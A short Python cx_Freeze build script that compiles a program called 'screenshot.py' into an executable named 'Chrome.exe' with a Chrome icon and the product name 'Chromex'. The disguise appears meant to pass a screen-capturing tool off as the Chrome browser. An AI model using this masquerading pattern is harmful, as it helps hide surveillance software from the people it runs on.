import cx_Freeze

executables = [cx_Freeze.Executable("screenshot.py", targetName="Chrome.exe", icon="C:\\MrJoker\\Screenshot\\Chrome-icon.png")]

cx_Freeze.setup(
    name = "Chromex",
    options = {"build_exe": {"packages":["os"]}},
    executables = executables
)
